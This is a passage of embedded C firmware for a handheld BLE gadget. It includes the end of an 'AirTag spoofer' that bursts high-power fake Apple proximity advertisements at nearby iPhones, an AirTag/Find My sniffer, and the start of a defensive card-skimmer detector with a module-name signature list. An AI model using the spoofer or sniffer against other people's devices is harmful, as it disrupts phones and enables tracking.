  AirTagSpoofer_s_cacheModel[0] = '\0';
  AirTagSpoofer_s_cacheMac[0] = '\0';
  AirTagSpoofer_s_cacheTx[0] = '\0';
  AirTagSpoofer_s_cacheHint[0] = '\0';
  memset(AirTagSpoofer_s_log, 0, sizeof(AirTagSpoofer_s_log));
  memset(AirTagSpoofer_s_dispLog, 0, sizeof(AirTagSpoofer_s_dispLog));
  memset(AirTagSpoofer_s_dispColor, 0, sizeof(AirTagSpoofer_s_dispColor));

  AirTagSpoofer_buildProximityPacket();

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();
  AirTagSpoofer_runUI();
  AirTagSpoofer_updateNavLabels();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  AirTagSpoofer_updateInfoFields(true);
  AirTagSpoofer_logLine("[*] Ready", ORANGE);
  AirTagSpoofer_logLine("[*] Unlock iPhone, then Start", UI_DIM_TEXT);
}

void AirTagSpoofer_airTagLoop(void) {
  if (feature_exit_requested) {
    AirTagSpoofer_teardown();
    return;
  }
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    AirTagSpoofer_teardown();
    feature_exit_requested = true;
    return;
  }

  AirTagSpoofer_handleButtons();
  AirTagSpoofer_runUI();
  updateStatusBar();
  maintainTouchNavBar();

  if (AirTagSpoofer_s_running) {
    const unsigned long now = sys_monotonic_ms();
    if (now - AirTagSpoofer_s_lastBurstMs >= AirTagSpoofer_BURST_INTERVAL_MS) {
      AirTagSpoofer_burstOnce(false);
    }
  }

  if (feature_exit_requested) {
    AirTagSpoofer_teardown();
  }
}

void AirTagSpoofer_exit(void) { AirTagSpoofer_teardown(); }

#undef SCREEN_WIDTH
#define SCREEN_WIDTH 240
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#undef STATUS_BAR_HEIGHT
#define STATUS_BAR_HEIGHT 16
#undef ICON_SIZE
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 1

enum { AirTagSniffer_HDR_Y = 42 };
enum { AirTagSniffer_COL_Y = 58 };
enum { AirTagSniffer_LIST_Y = 74 };
enum { AirTagSniffer_ROW_H = 18 };
enum { AirTagSniffer_MAX_HITS = 32 };
static const unsigned long AirTagSniffer_BTN_DEBOUNCE_MS = 220;
static const unsigned long AirTagSniffer_UI_MS = 250;
enum { AirTagSniffer_LINE_LEN = 36 };

typedef uint8_t AirTagSniffer_HitKind;
enum {
  AirTagSniffer_HIT_FIND_MY = 0,  // Apple Offline Finding 0x12
  AirTagSniffer_HIT_NEW_AT = 1,   // Continuity 0x07 prefix 0x05 (New AirTag)
};

typedef struct AirTagSniffer_Hit {
  uint8_t mac[6];
  int8_t rssi;
  uint8_t kind;
  uint8_t status;
  uint16_t hits;
  uint32_t lastSeen;
  bool dirty;
} AirTagSniffer_Hit;
#define AirTagSniffer_Hit_INITIALIZER {0}
;

static int AirTagSniffer_iconX[ICON_NUM] = {10};
static int AirTagSniffer_iconY = STATUS_BAR_Y_OFFSET;
static bool AirTagSniffer_s_uiDrawn = false;
static bool AirTagSniffer_s_chromeDrawn = false;
static bool AirTagSniffer_s_scanning = false;
static bool AirTagSniffer_s_listDirty = true;
static unsigned long AirTagSniffer_s_lastBtnMs = 0;
static unsigned long AirTagSniffer_s_lastUiMs = 0;

static AirTagSniffer_Hit AirTagSniffer_s_hits[AirTagSniffer_MAX_HITS];
static int AirTagSniffer_s_hitCount = 0;
static int AirTagSniffer_s_selected = 0;
static int AirTagSniffer_s_page = 0;

static ble_scan_t* AirTagSniffer_s_scan = NULL;
static portMUX_TYPE AirTagSniffer_s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool AirTagSniffer_s_hasUpdates = false;

static char AirTagSniffer_s_cacheFound[12] = {0};
static char AirTagSniffer_s_cacheState[10] = {0};

static int AirTagSniffer_listBottomY(void) { return bleContentBottom() - 2; }

static int AirTagSniffer_rowsPerPage(void) {
  const int h = AirTagSniffer_listBottomY() - AirTagSniffer_LIST_Y;
  if (h < AirTagSniffer_ROW_H) {
    return 1;
  }
  return h / AirTagSniffer_ROW_H;
}

static const char* AirTagSniffer_kindLabel(uint8_t kind) {
  switch (kind) {
    case AirTagSniffer_HIT_FIND_MY:
      return "FindMy";
    case AirTagSniffer_HIT_NEW_AT:
      return "NewAT";
    default:
      return "Apple";
  }
}

static void AirTagSniffer_updateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels(AirTagSniffer_s_scanning ? "Stop" : "Start", "Clear",
                    "Exit", "Prev", "Next");
  redrawTouchButtonBar();
}

static void AirTagSniffer_paintField(int x, int y, int w, char* cache,
                                     size_t cacheSz, const char* text,
                                     uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }
  display_set_text_size(&(tft), 1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = display_text_width(&(tft), cache, 0) + 2;
    const int newW = text[0] ? (display_text_width(&(tft), text, 0) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  display_fill_rect(&(tft), x, y, clearW, 10, TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), x, y);
  display_print(&(tft), (TEXT(text)).data);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void AirTagSniffer_drawChrome(void) {
  if (AirTagSniffer_s_chromeDrawn) {
    return;
  }
  AirTagSniffer_s_chromeDrawn = true;

  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
  display_set_cursor(&(tft), 10, AirTagSniffer_COL_Y);
  display_print(&(tft), "TYPE");
  display_set_cursor(&(tft), 58, AirTagSniffer_COL_Y);
  display_print(&(tft), "MAC");
  display_set_cursor(&(tft), 200, AirTagSniffer_COL_Y);
  display_print(&(tft), "RSSI");
  display_draw_fast_h_line(&(tft), 10, AirTagSniffer_COL_Y + 12,
                           SCREEN_WIDTH - 20, UI_LINE);
}

static void AirTagSniffer_updateHeader(bool force) {
  AirTagSniffer_drawChrome();
  if (force) {
    AirTagSniffer_s_cacheFound[0] = '\0';
    AirTagSniffer_s_cacheState[0] = '\0';
  }
  char found[12];
  snprintf(found, sizeof(found), "FOUND %d", AirTagSniffer_s_hitCount);
  AirTagSniffer_paintField(10, AirTagSniffer_HDR_Y, 90,
                           AirTagSniffer_s_cacheFound,
                           sizeof(AirTagSniffer_s_cacheFound), found, WHITE);
  AirTagSniffer_paintField(200, AirTagSniffer_HDR_Y, 40,
                           AirTagSniffer_s_cacheState,
                           sizeof(AirTagSniffer_s_cacheState),
                           AirTagSniffer_s_scanning ? "LIVE" : "IDLE",
                           AirTagSniffer_s_scanning ? ORANGE : UI_DIM_TEXT);
}

static void AirTagSniffer_formatRow(const AirTagSniffer_Hit* h, char* out,
                                    size_t outSz) {
  snprintf(out, outSz, "%-6s %02X:%02X:%02X:%02X:%02X:%02X %4d",
           AirTagSniffer_kindLabel((*h).kind), (*h).mac[0], (*h).mac[1],
           (*h).mac[2], (*h).mac[3], (*h).mac[4], (*h).mac[5], (int)(*h).rssi);
}

static void AirTagSniffer_paintRow(int listIndex, bool selected) {
  const int per = AirTagSniffer_rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = AirTagSniffer_s_page * per + listIndex;
  const int y = AirTagSniffer_LIST_Y + listIndex * AirTagSniffer_ROW_H;
  if (y + AirTagSniffer_ROW_H > AirTagSniffer_listBottomY()) {
    return;
  }

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, AirTagSniffer_ROW_H, TFT_BLACK);

  if (absIndex >= AirTagSniffer_s_hitCount) {
    return;
  }

  char line[AirTagSniffer_LINE_LEN];
  AirTagSniffer_formatRow(&(AirTagSniffer_s_hits[absIndex]), line,
                          sizeof(line));

  const uint16_t color = selected ? ORANGE : WHITE;
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), 10, y + 4);
  display_print(&(tft), (TEXT(line)).data);
  if (selected) {
    display_fill_rect(&(tft), 2, y + 2, 3, AirTagSniffer_ROW_H - 4, ORANGE);
  }
}

static void AirTagSniffer_redrawList(void) {
  const int per = AirTagSniffer_rowsPerPage();
  const int start = AirTagSniffer_s_page * per;

  if (AirTagSniffer_s_hitCount <= 0) {
    const int h = AirTagSniffer_listBottomY() - AirTagSniffer_LIST_Y;
    if (h > 0) {
      display_fill_rect(&(tft), 0, AirTagSniffer_LIST_Y, SCREEN_WIDTH, h,
                        TFT_BLACK);
    }
    display_set_text_size(&(tft), 1);
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), 10, AirTagSniffer_LIST_Y + 8);
    display_print(&(tft),
                  (TEXT(AirTagSniffer_s_scanning ? "Listening for AirTags..."
                                                 : "Press Start to scan"))
                      .data);
    AirTagSniffer_s_listDirty = false;
    return;
  }

  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    AirTagSniffer_paintRow(i, absIndex == AirTagSniffer_s_selected);
  }
  AirTagSniffer_s_listDirty = false;
  for (int i = 0; i < AirTagSniffer_s_hitCount; i++) {
    AirTagSniffer_s_hits[i].dirty = false;
  }
}

static void AirTagSniffer_refreshDirtyRows(void) {
  const int per = AirTagSniffer_rowsPerPage();
  const int start = AirTagSniffer_s_page * per;
  const int end = start + per;
  bool any = AirTagSniffer_s_listDirty;
  for (int i = start; i < end && i < AirTagSniffer_s_hitCount; i++) {
    if (AirTagSniffer_s_hits[i].dirty) {
      any = true;
      break;
    }
  }
  if (!any) {
    return;
  }
  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    if (absIndex < AirTagSniffer_s_hitCount &&
        (AirTagSniffer_s_listDirty || AirTagSniffer_s_hits[absIndex].dirty)) {
      AirTagSniffer_paintRow(i, absIndex == AirTagSniffer_s_selected);
      if (absIndex < AirTagSniffer_s_hitCount) {
        AirTagSniffer_s_hits[absIndex].dirty = false;
      }
    } else if (AirTagSniffer_s_listDirty &&
               absIndex >= AirTagSniffer_s_hitCount) {
      AirTagSniffer_paintRow(i, false);
    }
  }
  AirTagSniffer_s_listDirty = false;
}

static int AirTagSniffer_findHitIndex(const uint8_t mac[6]) {
  for (int i = 0; i < AirTagSniffer_s_hitCount; i++) {
    if (memcmp(AirTagSniffer_s_hits[i].mac, mac, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static void AirTagSniffer_upsertHit(const uint8_t mac[6], int8_t rssi,
                                    uint8_t kind, uint8_t status) {
  const int idx = AirTagSniffer_findHitIndex(mac);
  if (idx >= 0) {
    __auto_type h = &(AirTagSniffer_s_hits[idx]);
    if ((*h).rssi != rssi || (*h).status != status || (*h).kind != kind) {
      (*h).dirty = true;
    }
    (*h).rssi = rssi;
    (*h).kind = kind;
    (*h).status = status;
    (*h).hits++;
    (*h).lastSeen = sys_monotonic_ms();
    return;
  }
  if (AirTagSniffer_s_hitCount >= AirTagSniffer_MAX_HITS) {
    // Drop weakest RSSI to make room.
    int weakest = 0;
    for (int i = 1; i < AirTagSniffer_s_hitCount; i++) {
      if (AirTagSniffer_s_hits[i].rssi < AirTagSniffer_s_hits[weakest].rssi) {
        weakest = i;
      }
    }
    if (rssi < AirTagSniffer_s_hits[weakest].rssi) {
      return;
    }
    memmove(&AirTagSniffer_s_hits[weakest], &AirTagSniffer_s_hits[weakest + 1],
            (size_t)(AirTagSniffer_s_hitCount - weakest - 1) *
                sizeof(AirTagSniffer_Hit));
    AirTagSniffer_s_hitCount--;
    AirTagSniffer_s_listDirty = true;
  }

  __auto_type h = &(AirTagSniffer_s_hits[AirTagSniffer_s_hitCount++]);
  memcpy((*h).mac, mac, 6);
  (*h).rssi = rssi;
  (*h).kind = kind;
  (*h).status = status;
  (*h).hits = 1;
  (*h).lastSeen = sys_monotonic_ms();
  (*h).dirty = true;
  AirTagSniffer_s_listDirty = true;
}

static bool AirTagSniffer_parseAppleAdv(const uint8_t* data, size_t len,
                                        uint8_t* kindOut, uint8_t* statusOut) {
  if (!data || len < 4) {
    return false;
  }
  // NimBLE manufacturer data: company ID LE + payload.
  if (data[0] != 0x4C || data[1] != 0x00) {
    return false;
  }
  const uint8_t appleType = data[2];
  if (appleType == 0x12) {
    *kindOut = AirTagSniffer_HIT_FIND_MY;
    *statusOut = (len > 4) ? data[4] : 0;
    return true;
  }
  // Continuity Proximity Pairing â€” New AirTag prefix 0x05.
  if (appleType == 0x07 && len >= 5 && data[4] == 0x05) {
    *kindOut = AirTagSniffer_HIT_NEW_AT;
    *statusOut = data[4];
    return true;
  }
  return false;
}

static void AirTagSniffer_on_result(const ble_device_t* device, void* context) {
  (void)context;
  if (!AirTagSniffer_s_scanning || !device ||
      !ble_device_has_field(device, 0xff)) {
    return;
  }
  size_t md_len = 0;
  const uint8_t* md = ble_device_field(device, 0xff, &md_len);
  uint8_t kind = 0;
  uint8_t status = 0;
  if (!AirTagSniffer_parseAppleAdv(md, md_len, &kind, &status)) {
    return;
  }

  text_t addrStr = ble_device_address(device);
  unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0;
  if (sscanf((addrStr).data, "%02x:%02x:%02x:%02x:%02x:%02x", &b0, &b1, &b2,
             &b3, &b4, &b5) != 6) {
    return;
  }
  const uint8_t mac[6] = {(uint8_t)b0, (uint8_t)b1, (uint8_t)b2,
                          (uint8_t)b3, (uint8_t)b4, (uint8_t)b5};

  const int8_t rssi = (int8_t)device->rssi;

  portENTER_CRITICAL(&AirTagSniffer_s_mux);
  AirTagSniffer_upsertHit(mac, rssi, kind, status);
  AirTagSniffer_s_hasUpdates = true;
  portEXIT_CRITICAL(&AirTagSniffer_s_mux);
}

static void AirTagSniffer_stopScan(void) {
  if (AirTagSniffer_s_scan) {
    ble_scan_stop(AirTagSniffer_s_scan);
    ble_scan_set_callback(AirTagSniffer_s_scan, NULL, NULL);
  }
  AirTagSniffer_s_scanning = false;
}

static void AirTagSniffer_startScan(void) {
  if (!AirTagSniffer_s_scan) {
    ensureBleStackReady();
    AirTagSniffer_s_scan = ble_service_scan();
  }
  ble_scan_stop(AirTagSniffer_s_scan);
  ble_scan_set_callback(AirTagSniffer_s_scan, AirTagSniffer_on_result, NULL);
  (AirTagSniffer_s_scan->active = true);
  (AirTagSniffer_s_scan->interval_ms = 80);
  (AirTagSniffer_s_scan->window_ms = 60);
  (AirTagSniffer_s_scan->duplicate_filter = false);
  AirTagSniffer_s_scanning = true;
  // Non-blocking continuous scan. start(0, false) is the BLOCKING overload
  // and hangs forever with duration 0.
  ble_scan_start(AirTagSniffer_s_scan, 0, false);
}

static void AirTagSniffer_clearHits(void) {
  portENTER_CRITICAL(&AirTagSniffer_s_mux);
  AirTagSniffer_s_hitCount = 0;
  AirTagSniffer_s_selected = 0;
  AirTagSniffer_s_page = 0;
  AirTagSniffer_s_listDirty = true;
  AirTagSniffer_s_hasUpdates = true;
  portEXIT_CRITICAL(&AirTagSniffer_s_mux);
}

static void AirTagSniffer_clampSelection(void) {
  const int per = AirTagSniffer_rowsPerPage();
  if (AirTagSniffer_s_hitCount <= 0) {
    AirTagSniffer_s_selected = 0;
    AirTagSniffer_s_page = 0;
    return;
  }
  if (AirTagSniffer_s_selected >= AirTagSniffer_s_hitCount) {
    AirTagSniffer_s_selected = AirTagSniffer_s_hitCount - 1;
  }
  if (AirTagSniffer_s_selected < 0) {
    AirTagSniffer_s_selected = 0;
  }
  AirTagSniffer_s_page = AirTagSniffer_s_selected / per;
}

static void AirTagSniffer_handleButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - AirTagSniffer_s_lastBtnMs < AirTagSniffer_BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (AirTagSniffer_s_scanning) {
      AirTagSniffer_stopScan();
    } else {
      AirTagSniffer_startScan();
    }
    AirTagSniffer_updateHeader(true);
    AirTagSniffer_updateNavLabels();
    AirTagSniffer_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    AirTagSniffer_clearHits();
    AirTagSniffer_updateHeader(true);
    AirTagSniffer_redrawList();
    AirTagSniffer_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    if (AirTagSniffer_s_hitCount <= 0) {
      return;
    }
    const int prev = AirTagSniffer_s_selected;
    AirTagSniffer_s_selected = (AirTagSniffer_s_selected <= 0)
                                   ? (AirTagSniffer_s_hitCount - 1)
                                   : (AirTagSniffer_s_selected - 1);
    AirTagSniffer_clampSelection();
    if (AirTagSniffer_s_selected / AirTagSniffer_rowsPerPage() !=
        prev / AirTagSniffer_rowsPerPage()) {
      AirTagSniffer_s_listDirty = true;
      AirTagSniffer_redrawList();
    } else {
      const int per = AirTagSniffer_rowsPerPage();
      AirTagSniffer_paintRow(prev % per, false);
      AirTagSniffer_paintRow(AirTagSniffer_s_selected % per, true);
    }
    AirTagSniffer_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (AirTagSniffer_s_hitCount <= 0) {
      return;
    }
    const int prev = AirTagSniffer_s_selected;
    AirTagSniffer_s_selected =
        (AirTagSniffer_s_selected + 1) % AirTagSniffer_s_hitCount;
    AirTagSniffer_clampSelection();
    if (AirTagSniffer_s_selected / AirTagSniffer_rowsPerPage() !=
        prev / AirTagSniffer_rowsPerPage()) {
      AirTagSniffer_s_listDirty = true;
      AirTagSniffer_redrawList();
    } else {
      const int per = AirTagSniffer_rowsPerPage();
      AirTagSniffer_paintRow(prev % per, false);
      AirTagSniffer_paintRow(AirTagSniffer_s_selected % per, true);
    }
    AirTagSniffer_s_lastBtnMs = now;
    return;
  }
}

static void AirTagSniffer_runUI(void) {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};
  if (!AirTagSniffer_s_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i]) {
        display_draw_bitmap(&(tft), AirTagSniffer_iconX[i], AirTagSniffer_iconY,
                            icons[i], ICON_SIZE, ICON_SIZE, ORANGE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    AirTagSniffer_s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > AirTagSniffer_iconX[i] &&
              x < AirTagSniffer_iconX[i] + ICON_SIZE) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void AirTagSniffer_teardown(void) {
  AirTagSniffer_stopScan();
  AirTagSniffer_s_scan = NULL;
}

void AirTagSniffer_airTagSnifferSetup(void) {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);
  setupTouchscreen();

  AirTagSniffer_s_uiDrawn = false;
  AirTagSniffer_s_chromeDrawn = false;
  AirTagSniffer_s_scanning = false;
  AirTagSniffer_s_listDirty = true;
  AirTagSniffer_s_hitCount = 0;
  AirTagSniffer_s_selected = 0;
  AirTagSniffer_s_page = 0;
  AirTagSniffer_s_hasUpdates = false;
  AirTagSniffer_s_lastBtnMs = 0;
  AirTagSniffer_s_lastUiMs = 0;
  AirTagSniffer_s_cacheFound[0] = '\0';
  AirTagSniffer_s_cacheState[0] = '\0';
  AirTagSniffer_s_scan = NULL;

  // Stop any other BLE scan that may be holding the radio.
  {
    ble_scan_t* existing = ble_service_scan();
    if (existing) {
      ble_scan_stop(existing);
    }
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();
  AirTagSniffer_runUI();
  AirTagSniffer_updateNavLabels();
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  AirTagSniffer_updateHeader(true);
  AirTagSniffer_redrawList();

  // Auto-start so the feature is immediately useful.
  AirTagSniffer_startScan();
  AirTagSniffer_updateHeader(true);
  AirTagSniffer_updateNavLabels();
}

void AirTagSniffer_airTagSnifferLoop(void) {
  if (feature_exit_requested) {
    AirTagSniffer_teardown();
    return;
  }
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    AirTagSniffer_teardown();
    feature_exit_requested = true;
    return;
  }

  AirTagSniffer_handleButtons();
  AirTagSniffer_runUI();
  updateStatusBar();
  maintainTouchNavBar();

  const unsigned long now = sys_monotonic_ms();
  if (AirTagSniffer_s_hasUpdates ||
      (now - AirTagSniffer_s_lastUiMs >= AirTagSniffer_UI_MS)) {
    AirTagSniffer_s_lastUiMs = now;
    bool updates = false;
    portENTER_CRITICAL(&AirTagSniffer_s_mux);
    updates = AirTagSniffer_s_hasUpdates;
    AirTagSniffer_s_hasUpdates = false;
    portEXIT_CRITICAL(&AirTagSniffer_s_mux);

    if (updates || AirTagSniffer_s_listDirty) {
      AirTagSniffer_clampSelection();
      AirTagSniffer_updateHeader(false);
      if (AirTagSniffer_s_listDirty) {
        AirTagSniffer_redrawList();
      } else {
        AirTagSniffer_refreshDirtyRows();
      }
    }
  }

  // Keep continuous scan alive if NimBLE stopped it.
  if (AirTagSniffer_s_scanning && AirTagSniffer_s_scan &&
      !ble_scan_is_active(AirTagSniffer_s_scan)) {
    ble_scan_start(AirTagSniffer_s_scan, 0, false);
  }

  if (feature_exit_requested) {
    AirTagSniffer_teardown();
  }
}

void AirTagSniffer_exit(void) { AirTagSniffer_teardown(); }

#undef SCREEN_WIDTH
#define SCREEN_WIDTH 240
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#undef STATUS_BAR_HEIGHT
#define STATUS_BAR_HEIGHT 16
#undef ICON_SIZE
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 1

enum { BleSkimmer_HDR_Y = 40 };
enum { BleSkimmer_LIST_Y = 58 };
enum { BleSkimmer_ROW_H = 32 };
enum { BleSkimmer_MAX_HITS = 32 };
enum { BleSkimmer_NAME_LEN = 18 };
enum { BleSkimmer_LABEL_LEN = 12 };
static const unsigned long BleSkimmer_BTN_DEBOUNCE_MS = 220;

typedef struct BleSkimmer_Hit {
  uint8_t mac[6];
  int8_t rssi;
  uint8_t threat;
  uint16_t hits;
  char name[BleSkimmer_NAME_LEN];
  char label[BleSkimmer_LABEL_LEN];
  bool dirty;
} BleSkimmer_Hit;
#define BleSkimmer_Hit_INITIALIZER {0}
;

typedef struct BleSkimmer_Signature {
  const char* needle;  // normalized (A-Z0-9 only)
  const char* label;
  uint8_t threat;
} BleSkimmer_Signature;
#define BleSkimmer_Signature_INITIALIZER {0}
;

// Default names used on hobbyist BT/BLE serial modules commonly found in
// Bluetooth-enabled card skimmers (SparkFun/Marauder research). A hit means
// a suspicious module is nearby — not proof of a skimmer.
static const BleSkimmer_Signature BleSkimmer_s_sigs[] = {
    {"FREE2MOVE", "FREE2MOVE", 5}, {"BTHC05", "BT-HC05", 5},
    {"BTHC06", "BT-HC06", 5},      {"MLTBT05", "MLT-BT05", 4},
    {"BT04A", "BT04-A", 4},        {"BTSPP", "BT-SPP", 4},
    {"CC41A", "CC41-A", 4},        {"SPPCA", "SPP-CA", 4},
    {"LINVOR", "LINVOR", 4},       {"HC03", "HC-03", 5},
    {"HC04", "HC-04", 5},          {"HC05", "HC-05", 5},
    {"HC06", "HC-06", 5},          {"HC08", "HC-08", 5},
    {"BT04", "BT-04", 4},          {"BT05", "BT-05", 4},
    {"BT06", "BT-06", 4},          {"BT08", "BT-08", 4},
    {"CC41", "CC41", 4},           {"HM10", "HM-10", 3},
    {"HM11", "HM-11", 3},          {"HM19", "HM-19", 3},
    {"AT09", "AT-09", 3},          {"JDY08", "JDY-08", 4},
    {"JDY10", "JDY-10", 4},        {"JDY16", "JDY-16", 4},
    {"JDY23", "JDY-23", 4},        {"JDY31", "JDY-31", 4},
};

static int BleSkimmer_iconX[ICON_NUM] = {10};
static int BleSkimmer_iconY = STATUS_BAR_Y_OFFSET;
static bool BleSkimmer_s_uiDrawn = false;
static bool BleSkimmer_s_chromeDrawn = false;
static bool BleSkimmer_s_scanning = false;
static bool BleSkimmer_s_listDirty = true;
static unsigned long BleSkimmer_s_lastBtnMs = 0;
static unsigned long BleSkimmer_s_lastUiMs = 0;

static BleSkimmer_Hit BleSkimmer_s_hits[BleSkimmer_MAX_HITS];
static int BleSkimmer_s_hitCount = 0;
static int BleSkimmer_s_drawnCount = 0;
static int BleSkimmer_s_selected = 0;
static int BleSkimmer_s_page = 0;

static ble_scan_t* BleSkimmer_s_scan = NULL;
static portMUX_TYPE BleSkimmer_s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool BleSkimmer_s_hasUpdates = false;

static char BleSkimmer_s_cacheFound[24] = {0};
static char BleSkimmer_s_cacheState[12] = {0};

static int BleSkimmer_listBottomY(void) { return bleContentBottom() - 2; }

static int BleSkimmer_rowsPerPage(void) {
  const int h = BleSkimmer_listBottomY() - BleSkimmer_LIST_Y;
  if (h < BleSkimmer_ROW_H) {
    return 1;
  }
  return h / BleSkimmer_ROW_H;
}

static void BleSkimmer_updateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels(BleSkimmer_s_scanning ? "Stop" : "Start", "Clear", "Exit",
                    "Prev", "Next");
  redrawTouchButtonBar();
}

static void BleSkimmer_paintField(int x, int y, int w, char* cache,
                                  size_t cacheSz, const char* text,
                                  uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }
  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = display_text_width(&(tft), cache, 0) + 2;
    const int newW = text[0] ? (display_text_width(&(tft), text, 0) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  display_fill_rect(&(tft), x, y, clearW, 10, TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), x, y);
  display_print(&(tft), (TEXT(text)).data);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void BleSkimmer_drawChrome(void) {
  if (BleSkimmer_s_chromeDrawn) {
    return;
  }
  BleSkimmer_s_chromeDrawn = true;
  display_draw_fast_h_line(&(tft), 10, BleSkimmer_HDR_Y + 12, SCREEN_WIDTH - 20,
                           UI_LINE);
}

static void BleSkimmer_updateHeader(bool force) {
  BleSkimmer_drawChrome();
  if (force) {
    BleSkimmer_s_cacheFound[0] = '\0';
    BleSkimmer_s_cacheState[0] = '\0';
  }

  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);

  char found[40];
  if (BleSkimmer_s_hitCount <= 0) {
    snprintf(found, sizeof(found), "No suspects yet");
  } else if (BleSkimmer_s_hitCount == 1) {
    snprintf(found, sizeof(found), "1 suspect nearby");
  } else {
    snprintf(found, sizeof(found), "%d suspects nearby", BleSkimmer_s_hitCount);
  }
  BleSkimmer_paintField(10, BleSkimmer_HDR_Y, 150, BleSkimmer_s_cacheFound,
                        sizeof(BleSkimmer_s_cacheFound), found,
                        BleSkimmer_s_hitCount > 0 ? ORANGE : UI_DIM_TEXT);
  BleSkimmer_paintField(170, BleSkimmer_HDR_Y, 65, BleSkimmer_s_cacheState,
                        sizeof(BleSkimmer_s_cacheState),
                        BleSkimmer_s_scanning ? "Scanning" : "Stopped",
                        BleSkimmer_s_scanning ? ORANGE : UI_DIM_TEXT);
}

static void BleSkimmer_paintRow(int listIndex, bool selected) {
  const int per = BleSkimmer_rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = BleSkimmer_s_page * per + listIndex;
  const int y = BleSkimmer_LIST_Y + listIndex * BleSkimmer_ROW_H;
  if (y + BleSkimmer_ROW_H > BleSkimmer_listBottomY()) {
    return;
  }

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, BleSkimmer_ROW_H, TFT_BLACK);
  if (absIndex >= BleSkimmer_s_hitCount) {
    return;
  }

  __auto_type h = &(BleSkimmer_s_hits[absIndex]);
  const uint16_t titleColor = selected ? ORANGE : WHITE;
  const uint16_t detailColor = selected ? ORANGE : UI_DIM_TEXT;

  // Prefer advertised name; fall back to matched module type.
  const char* primary =
      (*h).name[0] ? (*h).name : ((*h).label[0] ? (*h).label : "Suspect");

  // Keep both lines on font 1 so name/MAC never overlap.
  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);

